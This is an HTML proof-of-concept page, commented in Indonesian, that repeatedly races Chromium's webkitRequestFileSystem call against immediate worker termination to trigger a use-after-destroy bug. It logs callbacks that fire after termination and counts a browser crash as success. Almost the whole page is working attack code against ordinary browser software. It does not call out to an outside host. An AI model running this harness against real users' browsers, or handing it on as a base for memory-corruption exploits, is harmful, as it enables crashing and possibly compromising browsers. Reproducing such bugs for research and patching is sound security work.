<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Worker FileSystem Race Condition PoC</title>
    <style>
        body { 
            font-family: 'Consolas', 'Monaco', monospace; 
            padding: 20px; 
            background: #0d1117; 
            color: #c9d1d9;
            line-height: 1.4;
        }
        h1, h2 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        #controls { 
            background: #161b22; 
            padding: 15px; 
            border-radius: 6px; 
            margin: 15px 0;
            border: 1px solid #30363d;
        }
        button { 
            padding: 10px 20px; 
            margin: 5px; 
            cursor: pointer; 
            font-weight: bold; 
            border: none; 
            border-radius: 4px;
            font-size: 14px;
        }
        #btnStart { background: #238636; color: white; }
        #btnStart:hover { background: #2ea043; }
        #btnStart:disabled { background: #23863680; cursor: not-allowed; }
        #btnStop { background: #da3633; color: white; }
        #btnStop:hover { background: #f85149; }
        #btnClear { background: #30363d; color: #c9d1d9; }
        #btnClear:hover { background: #484f58; }
        
        #stats { 
            display: flex; 
            gap: 20px; 
            margin: 10px 0; 
            font-size: 13px;
        }
        .stat-box { 
            background: #21262d; 
            padding: 8px 12px; 
            border-radius: 4px;
            border: 1px solid #30363d;
        }
        .stat-label { color: #8b949e; }
        .stat-value { color: #58a6ff; font-weight: bold; }
        
        #log { 
            background: #010409; 
            border: 1px solid #30363d; 
            border-radius: 6px;
            height: 400px; 
            overflow-y: auto; 
            padding: 10px; 
            font-size: 11px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .log-entry { margin: 2px 0; }
        .log-js { color: #7ee787; }
        .log-cpp { color: #ffa657; }
        .log-async { color: #d2a8ff; }
        .log-race { color: #ff7b72; font-weight: bold; }
        .log-error { color: #f85149; }
        .log-success { color: #3fb950; }
        .log-info { color: #8b949e; }
        
        code { 
            background: #6e768130; 
            padding: 2px 6px; 
            border-radius: 3px;
            font-size: 0.95em;
        }
        
        .flow-step { 
            margin: 8px 0; 
            padding-left: 15px; 
            border-left: 2px solid #30363d;
        }
        .flow-step.active { border-left-color: #58a6ff; background: #161b2280; padding: 8px 15px; }
    </style>
</head>
<body>

    <h1>üî¨ Worker FileSystem Use-After-Destroy PoC</h1>
    <p>Target: <code>WorkerGlobalScopeFileSystem::webkitRequestFileSystem</code> (Async)</p>
    <p>Bug: Callback dipanggil setelah <code>WorkerGlobalScope</code> di-terminate ‚Üí Use-After-Destroy</p>

    <div id="controls">
        <button id="btnStart" onclick="startAttack()">‚ñ∂ Start Race Attack</button>
        <button id="btnStop" onclick="stopAttack()">‚èπ Stop</button>
        <button id="btnClear" onclick="clearLog()">üóë Clear Log</button>
        
        <div id="stats">
            <div class="stat-box"><span class="stat-label">Iterations:</span> <span class="stat-value" id="statIter">0</span></div>
            <div class="stat-box"><span class="stat-label">Callbacks Fired:</span> <span class="stat-value" id="statCb">0</span></div>
            <div class="stat-box"><span class="stat-label">Status:</span> <span class="stat-value" id="statStatus">IDLE</span></div>
            <div class="stat-box"><span class="stat-label">Target:</span> <span class="stat-value">webkitRequestFileSystem</span></div>
        </div>
    </div>

    <div id="log"></div>

    <!-- ========================================
         INLINE WORKER CODE (Blob)
         Mengimplementasikan alur JS di flowchart
         ======================================== -->
    <script id="worker-code" type="javascript/worker">
        // [START: JS di Worker] - Langkah 1 di flowchart
        self.onmessage = function(e) {
            const { action, quotaSize } = e.data;
            
            if (action === 'attack') {
                // [1] Worker JS memanggil webkitRequestFileSystem
                log('[JS-1] Calling webkitRequestFileSystem(TEMPORARY, 1024, success, error)');
                
                // Request quota dulu agar operasi benar-benar trigger IPC (opsional tapi meningkatkan peluang)
                if (self.webkitPersistentStorage && quotaSize > 0) {
                    log('[JS-1a] Requesting quota first...');
                    self.webkitPersistentStorage.requestQuota(
                        quotaSize,
                        function(grantedBytes) {
                            log('[JS-1b] Quota granted: ' + grantedBytes + ' bytes');
                            triggerFileSystemAPI();
                        },
                        function(err) {
                            log('[JS-1c] Quota request failed, trying direct call...', 'log-info');
                            triggerFileSystemAPI();
                        }
                    );
                } else {
                    triggerFileSystemAPI();
                }
            }
            
            function triggerFileSystemAPI() {
                // [1] Inti: Panggil API async yang rentan
                // Ini akan masuk ke Blink: WorkerGlobalScopeFileSystem::webkitRequestFileSystem
                try {
                    self.webkitRequestFileSystem(
                        self.TEMPORARY,           // type
                        1024,                     // size
                        function successCallback(filesystem) {
                            // [12-14] Callback success dari C++
                            // ‚ö†Ô∏è RACE: Jika worker sudah terminate, context sudah destroyed!
                            log('[JS-12] ‚úÖ SUCCESS callback fired!', 'log-success');
                            log('[JS-13] Filesystem name: ' + (filesystem ? filesystem.name : 'null'), 'log-info');
                            self.postMessage({ 
                                type: 'callback-success', 
                                fsName: filesystem ? filesystem.name : null,
                                timestamp: Date.now()
                            });
                        },
                        function errorCallback(error) {
                            // [12b-13b] Callback error dari C++
                            log('[JS-12b] ‚ùå ERROR callback fired: code=' + error.code, 'log-error');
                            self.postMessage({ 
                                type: 'callback-error', 
                                errorCode: error.code,
                                timestamp: Date.now()
                            });
                        }
                    );
                    log('[JS-10] ‚úÖ webkitRequestFileSystem dispatched (async)');
                } catch (ex) {
                    log('[JS-ERR] Exception calling API: ' + ex.message, 'log-error');
                    self.postMessage({ type: 'api-exception', message: ex.message });
                }
            }
            
            function log(msg, cls = 'log-js') {
                self.postMessage({ type: 'log', message: msg, class: cls });
            }
        };
    </script>

    <!-- ========================================
         MAIN THREAD CODE
         Mengontrol race condition attack
         ======================================== -->
    <script>
        // State global
        let isRunning = false;
        let iteration = 0;
        let callbacksFired = 0;
        let workerBlob = null;
        let workerURL = null;
        
        // DOM references
        const logDiv = document.getElementById('log');
        const statIter = document.getElementById('statIter');
        const statCb = document.getElementById('statCb');
        const statStatus = document.getElementById('statStatus');
        const btnStart = document.getElementById('btnStart');
        
        // ========================================
        // LOGGING UTILITIES
        // ========================================
        function log(msg, cls = 'log-info') {
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + cls;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function clearLog() {
            logDiv.innerHTML = '';
            iteration = 0;
            callbacksFired = 0;
            updateStats();
            log('Log cleared', 'log-info');
        }
        
        function updateStats() {
            statIter.textContent = iteration;
            statCb.textContent = callbacksFired;
        }
        
        function setStatus(status, cls = '') {
            statStatus.textContent = status;
            statStatus.className = 'stat-value ' + cls;
        }
        
        // ========================================
        // WORKER SETUP (Blob URL untuk inline code)
        // ========================================
        function initWorker() {
            if (workerURL) return workerURL;
            
            const workerCode = document.getElementById('worker-code').textContent;
            workerBlob = new Blob([workerCode], { type: 'application/javascript' });
            workerURL = URL.createObjectURL(workerBlob);
            log('[Main] Worker blob URL created', 'log-info');
            return workerURL;
        }
        
        // ========================================
        // ATTACK CONTROL
        // ========================================
        function startAttack() {
            if (isRunning) return;
            
            // Cek dukungan API
            if (!window.webkitRequestFileSystem && !window.webkitPersistentStorage) {
                log('[Main] ‚ö†Ô∏è WebKit FileSystem API tidak tersedia di browser ini', 'log-error');
                log('[Main] Coba Chrome versi lama atau enable flag: --enable-experimental-web-platform-features', 'log-info');
                return;
            }
            
            isRunning = true;
            iteration = 0;
            callbacksFired = 0;
            updateStats();
            setStatus('RACING...', 'log-success');
            btnStart.disabled = true;
            
            log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'log-info');
            log('üöÄ Starting Race Condition Attack', 'log-success');
            log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê', 'log-info');
            log('[Main-2] Target: WorkerGlobalScopeFileSystem::webkitRequestFileSystem', 'log-cpp');
            log('[Main-10] Strategy: Dispatch async ‚Üí immediate worker.terminate()', 'log-race');
            log('');
            
            initWorker();
            loopAttack();
        }
        
        function stopAttack() {
            if (!isRunning) return;
            isRunning = false;
            setStatus('STOPPED', 'log-error');
            btnStart.disabled = false;
            log('');
            log('üõë Attack stopped by user', 'log-error');
            log('Final stats: ' + iteration + ' iterations, ' + callbacksFired + ' callbacks fired', 'log-info');
        }
        
        // ========================================
        // RACE CONDITION LOOP (Inti PoC)
        // ========================================
        async function loopAttack() {
            while (isRunning) {
                iteration++;
                updateStats();
                
                // [2-10] Buat worker baru setiap iterasi = ExecutionContext baru
                const worker = new Worker(workerURL);
                const workerId = `W-${iteration}`;
                
                // Setup message handler untuk logging dari worker
                worker.onmessage = (e) => {
                    const data = e.data;
                    if (data.type === 'log') {
                        log(`[${workerId}] ${data.message}`, data.class);
                    } else if (data.type === 'callback-success' || data.type === 'callback-error') {
                        callbacksFired++;
                        updateStats();
                        // ‚ö†Ô∏è Jika callback fired SETELAH terminate, ini indikasi bug!
                        log(`[${workerId}] ‚ö†Ô∏è Callback fired post-terminate?! type=${data.type}`, 'log-race');
                    }
                };
                
                worker.onerror = (e) => {
                    // Error setelah terminate adalah expected behavior
                    // log(`[${workerId}] Worker error: ${e.message}`, 'log-info');
                };
                
                // [1] Kirim perintah attack ke worker
                worker.postMessage({ 
                    action: 'attack', 
                    quotaSize: 5 * 1024 * 1024  // 5MB quota request
                });
                log(`[${workerId}] [Main-1] Posted attack message to worker`, 'log-js');
                
                // [10a] ‚ö° THE KILL: Terminate worker SEGERA setelah dispatch
                // Ini memicu: ExecutionContext::destroy() ‚Üí V8 context teardown
                // Race window: callback C++ mungkin masih return setelah ini
                worker.terminate();
                log(`[${workerId}] [Main-10a] üí• worker.terminate() called`, 'log-race');
                log(`[${workerId}] [Main-10b] ExecutionContext should be destroyed now`, 'log-race');
                
                // Logging periodik agar tidak spam
                if (iteration % 50 === 0) {
                    log(`[Main] Iteration ${iteration}... race window active`, 'log-info');
                }
                
                // Yield ke event loop agar:
                // 1. UI tetap responsif
                // 2. Race condition lebih natural (non-deterministic scheduling)
                await new Promise(resolve => setTimeout(resolve, 0));
            }
        }
        
        // ========================================
        // CLEANUP
        // ========================================
        window.addEventListener('beforeunload', () => {
            if (workerURL) {
                URL.revokeObjectURL(workerURL);
                log('[Main] Worker blob URL revoked', 'log-info');
            }
        });
        
        // Auto-start info
        log('üëâ Klik "Start Race Attack" untuk memulai', 'log-info');
        log('üìä Pantau "Callbacks Fired" - jika > 0 setelah terminate, potensi bug terdeteksi', 'log-info');
        log('üí• Crash browser = bug berhasil direproduksi (cek chrome://crashes)', 'log-info');
    </script>
</body>
</html>
